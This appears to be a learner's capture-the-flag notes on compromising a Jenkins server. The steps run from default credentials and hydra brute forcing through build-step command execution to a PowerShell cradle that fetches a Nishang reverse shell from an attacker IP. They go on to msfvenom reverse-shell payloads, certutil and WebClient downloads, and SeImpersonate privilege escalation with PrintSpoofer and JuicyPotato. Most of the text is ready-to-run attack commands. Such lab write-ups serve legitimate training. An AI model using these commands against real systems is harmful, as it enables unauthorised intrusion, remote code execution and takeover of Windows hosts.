Learn how to exploit a common misconfiguration on a widely used automation server
Jenkins

Jetty/9.4.z-SNAPSHOT appears to be outdated (current is at least 11.0.6). Jetty 10.0.6 AND 9.4.41.v20210516 are also currently supported.

The scans reveal the jenkins version under use is 2.190.1
quick research shows its default login is admin:admin
Alternatively, use hydra to determine the same
Once logged in, there is a "configure build" option that runs an editable whoami command

Tried replacing it with powershell one liner rev shell, but gives some errors
Perplexity says "interactive TCP reverse shells are inherently unsuitable inside Jenkins build console"

So, we try to use Nishang's ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
and as per the git, we have to serve it over python httpServer and download and run it using
`powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.34.38:80/PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.34.38 -Port 1234`

Once we get the reverse shell, we'll try downloading winPEAS, cuz it looks like we have seImpersonate (no response in this particular shell)

this command can be used to download a file from powershell from python -m httpServer
`powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/winPEASx64.exe','winPEAS.exe')"`
OR
`certutil -urlcache -split -f "http://ip-addr:port/file" [output-file]`
OR
`curl `

Create a reverce tcp shell and transfer it to windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.34.38 LPORT=443 -f exe -o rshell.exe
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.34.38 LPORT=443 -f exe -o rev.exe`

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.17.34.38:80/rshell.exe','rshell.exe')"`

since the seImpersonate priv is enabled, there are 2 ways to go ahead
juicyPotato OR PrintSpoofer

1. PrintSpoofer
   transfer the pritspoofer to low priv win user
   `Printspoofer -i -c powershell`
   But that's not working. so we'll go for juicy potato


2. JuicyPotato
   the potato.exe that I dowloaded wasnt suitable, and kept getting stuck.
   ==TIP== always try othr options available (https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe in this case)
   all these potatoes work
```powershell
.\jpm.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p rshell.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.17.34.38:80/rev.exe')" -t *

.\jpm.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p rshell.exe -a "/c powershell -ep bypass iex rshell.exe" -t *

.\jpm.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p rshell.exe -a "/c powershell -ep bypass iex cmd.exe" -t *

.\jpm.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p rshell.exe -t *
```
replace the -c with the appropriate CLSID from 
https://ohpe.it/juicy-potato/CLSID/

psexec -u NewUser -p Password cmd.ex
for cmd.exe
and
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\NewUser", (ConvertTo-SecureString "Password" -AsPlainText -Force))
Start-Process powershell -Credential $cred
for powershell